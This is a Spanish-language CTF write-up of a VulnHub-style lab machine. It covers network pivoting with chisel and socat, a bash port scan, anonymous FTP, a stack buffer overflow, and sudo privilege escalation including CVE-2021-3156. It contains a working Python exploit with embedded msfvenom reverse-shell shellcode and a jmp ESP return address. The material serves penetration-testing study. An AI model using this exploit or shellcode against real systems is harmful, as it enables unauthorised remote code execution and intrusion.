#ctf-machine #vulnhub #medium-machine #linux #simulacion-eccptv2 [[Simulation eCPPTv2 Map.canvas|Simulation eCPPTv2 Map]]

## Pivoting
No encontramos conectados en la máquina anterior "10.10.0.129" (Nagini) por lo que si nos fijamos tiene dos interfaces de red:
![[Pasted image 20240829220602.png]]

La red "192.168.100.0" es un segmento de red desconocido al cual no tenemos alcance por lo que podemos hacer un escaneo de máquinas de esta red con este pequeño *script* de "bash":
```bash
#!/usr/bin/bash

for i in $(seq 1 254); do
	for j in 20 21 22 23 24 80 443 445 8080; do
		timeout 1 bash -c "echo '' > /dev/tcp/192.168.100.$i/$j" &>/dev/null && echo "[i] Host 192.168.100.$i" &
	done
done; wait
```

Si lo ejecutamos vemos que hay dos máquinas disponibles:
![[Pasted image 20240829220812.png]]

Por lo que creamos un *proxy* con `chisel` para poder tener alcance desde nuestra máquina. Primeramente, ejecutamos `chisel` en nuestra máquina por el puerto 4321:
![[Pasted image 20240829222040.png]]

Una vez ejecutado, en la máquina intermedia, "192.168.159.147" debemos de ejecutar `socat` para que todo el tráfico que reciba por el puerto 999 lo mande a nuestra máquina por el puerto 4321.
![[Pasted image 20240829222453.png]]

Y finalmente, transferimos el binario de `chisel` a la máquina "10.10.0.129" con `spy` y `proxychains`:
![[Pasted image 20240829223303.png]]

Y una vez transferido, ejecutamos `chisel` como cliente para que se conecte a la 10.10.0.128 por el puerto 999 que es el equivalente a nuestro servidor de `chisel` por el puerto 4321:
![[Pasted image 20240829224318.png]]

Una vez conectados, solo hace falta añadir a nuestra configuración de `proxychains` que se encuentra en `/etc/proxychains4` nuestro puerto 1081:
![[Pasted image 20240829224817.png]]


## Enumeración inicial
Una vez configurado todo, ya tenemos alcance a las IP de la red 192.168.100.0/24 por lo que podemos hacer un primer escaneo con `nmap` a la IP 192.168.100.129 que es nuestra máquina objetiva para detectar los puertos TCP abiertos. Esta vez utilizamos `xargs` para agilizar el escaneo, ya que se demora bastante al utilizar `proxychains` junto a un túnel:
![[Pasted image 20240829232858.png]]

Como vemos hay 5 puertos abiertos, los puertos 21,22,80, 2222, 9898.

## Enumeración ftp
Si accedemos con `proxychains` y `ftp`, y intentamos utilizar el usuario "anonymous" obtenemos acceso:
![[Pasted image 20240829233908.png]]

Por lo que si listamos su contenido, vemos lo siguiente:
![[Pasted image 20240829233933.png]]

Por lo que nos descargamos el archivo con el comando "get":
![[Pasted image 20240829234011.png]]

Como vemos se trata de un ejecutable de 32 bits:
![[Pasted image 20240829234047.png]]

Por lo que si lo ejecutamos parece ser que nos abre un servidor. Por lo que si analizamos los puertos abiertos de la máquina, aparece uno nuevo:
![[Pasted image 20240829234200.png]]

Que coincide con un puerto de la máquina víctima. Por lo que podemos deducir que se está ejecutando este servidor en la máquina.

Si accedemos a nuestra máquina por el puerto 9898 con `nc` vemos lo siguiente:
![[Pasted image 20240829234943.png]]

## Buffer overflow
Por lo que podemos probar que pasa si introducimos muchos caracteres:
![[Pasted image 20240829235029.png]]
![[Pasted image 20240829235039.png]]

Como vemos se produce un "segmentation fault" por lo que se puede estar aconteciendo un *buffer overflow*. Si accedemos con `nc` y `proxychains` al puerto 9898 de la máquina vemos que tenemos lo mismo:
![[Pasted image 20240829235228.png]]

Por lo que si logramos acontecer un *buffer overflow* podemos obtener RCE en la máquina víctima.

Podemos utilizar `gdb` para empezar a analizar el binario. Primeramente, debemos de averiguar el *offset* hasta el registro EIP por lo que generamos un *pattern* de 500 caracteres:
![[Pasted image 20240829235643.png]]

Si este pattern lo introducimos haciendo *debugging* con `gdb`:
![[Pasted image 20240829235828.png]]

Vemos que el EIP tiene el siguiente valor:
![[Pasted image 20240829235904.png]]

Por lo que podemos buscar este patrón para saber el *offset* hasta el EIP:
![[Pasted image 20240830000001.png]]

Como vemos el *offset* es 112 por lo que lo siguiente que escribamos después de 112 caracteres se escribirá en el EIP.

Si nos fijamos en las protecciones que tiene el binario vemos que solo tiene el "canary" por lo que podemos ejecutar código en la pila:
![[Pasted image 20240830000230.png]]

No sabemos si está activado o no el ASLR en la máquina, en un principio supondremos que no. Por lo que ahora debemos de identificar donde iría el *shellcode* en nuestra cadena de caracteres. Como vemos, iría después del EIP:
![[Pasted image 20240830001539.png]]
![[Pasted image 20240830001637.png]]

Como el *shellcode* estará en el *stack* debemos de cargar la instrucción "jmp ESP" por lo que primero buscamos su "opcode" con `nasm`:
![[Pasted image 20240830003543.png]]

Como vemos el valor es FFE4 por lo que debemos de buscar en el código una dirección de memoria que tenga esa instrucción con `objdump`:
![[Pasted image 20240830003724.png]]

Como vemos la dirección de memoria 0x8049d55. Pero debemos de girarla, ya que debe de estar en Little-Endian. 

Ahora con `msfvenom` generamos el *shellcode* a ejecutar, en este caso, entablaremos una *reverse shell* a la "192.168.100.128" por el puerto 767 (que encaminará hasta nuestra máquina):
![[Pasted image 20240830013751.png]]

Una vez todo preparado unificamos todo en un *script* de Python:
```python
import socket, signal,sys

# Variables globales
IP = "192.168.100.129"
# IP = "127.0.0.1"
PORT = 9898

offset = 112
eip = b"\x55\x9d\x04\x08" # 0x8049d55 -> jmp ESP

shellcode =  b"\x90"*32 # nop 
shellcode += b"\xbf\x58\x7d\xa2\x88\xdb\xde\xd9\x74\x24\xf4"
shellcode += b"\x5a\x29\xc9\xb1\x12\x31\x7a\x12\x03\x7a\x12"
shellcode += b"\x83\xb2\x81\x40\x7d\x73\xa1\x72\x9d\x20\x16"
shellcode += b"\x2e\x08\xc4\x11\x31\x7c\xae\xec\x32\xee\x77"
shellcode += b"\x5f\x0d\xdc\x07\xd6\x0b\x27\x6f\x29\x43\xb3"
shellcode += b"\xef\xc1\x96\x3c\xed\xee\x1e\xdd\x41\x76\x71"
shellcode += b"\x4f\xf2\xc4\x72\xe6\x15\xe7\xf5\xaa\xbd\x96"
shellcode += b"\xda\x39\x55\x0f\x0a\x91\xc7\xa6\xdd\x0e\x55"
shellcode += b"\x6a\x57\x31\xe9\x87\xaa\x32"
data = b'A'*offset + eip + shellcode


def sig_handler(sig, frame):
    print("\n[!] Saliendo...\n\n")
    sys.exit(1)

signal.signal(signal.SIGINT, sig_handler)


def main():
    global IP
    global PORT

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((IP, PORT))
        s.send(data)



if __name__ == '__main__':
    main()
```

Por lo que únicamente debemos de crear un túnel hasta nuestra máquina. Primeramente, transferimos `socat` a la máquina "10.10.0.129" (192.168.100.128 donde entablara la *reverse shell*):
![[Pasted image 20240830005633.png]]

Una vez transferido haremos que todo el tráfico de red que llegue por el puerto 767 lo transfiera a la 10.10.0.128 por el puerto 767:
![[Pasted image 20240830005836.png]]

Y ahora en la máquina "10.10.0.128" (192.168.159.147), hacemos que el puerto 767 se convierta en el puerto 767 de mi máquina:
![[Pasted image 20240830010014.png]]

Por lo que si nos ponemos en escucha con `nc`:
![[Pasted image 20240830010050.png]]

Y ejecutamos el *exploit* con `proxychains`, obtenemos una *reverse shell*:
![[Pasted image 20240830013854.png]]

> [!NOTE] No se puede hacer el tratamiento de la TTY porque no hay "bash"

Si mostramos las IP's vemos que estamos en un contenedor:
![[Pasted image 20240830094525.png]]


## Escalada de privilegios
Si mostramos el contenido del directorio actual vemos un archivo oculto:
![[Pasted image 20240830094705.png]]

Si hacemos sudo -l podemos ver que podemos ejecutar como *root* cualquier comando:
![[Pasted image 20240830094844.png]]

Por lo que podemos ejecutar una `sh` con `sudo` y obtener root.
![[Pasted image 20240830094956.png]]

Por lo que si accedemos a `/root` podemos visualizar la primera *flag*:
![[Pasted image 20240830095116.png]]

Si nos fijamos el directorio `/root` tiene una nota:
![[Pasted image 20240830095232.png]]

Como vemos nos están pidiendo que analicemos el tráfico de red para ver quien está intentando acceder mediante FTP. Si analizamos con `tcpdump -v` vemos lo siguiente:
![[Pasted image 20240830100412.png]]

Podemos probar estas credenciales para acceder a la máquina mediante SSH:
![[Pasted image 20240830100601.png]]

Y como vemos logramos entrar. Por lo que podemos visualizar la segunda *flag*:
![[Pasted image 20240830100712.png]]

Si mostramos la versión de `sudo` vemos que se trata de esta versión:
![[Pasted image 20240830104020.png]]

Si buscamos *expoits* de esta versión encontramos este recurso:
https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss.py

Por lo que si lo ejecutamos indicando nuestra ruta de `sudo`, obtenemos una sh como *root*:
![[Pasted image 20240830105625.png]]

Y podemos visualizar la última *flag*:
![[Pasted image 20240830105733.png]]
![[Pasted image 20240830105801.png]]

___
#buffer-overflow #abusing-internal-services #abusing-sudoers #information-leakage #docker-breakout 
___
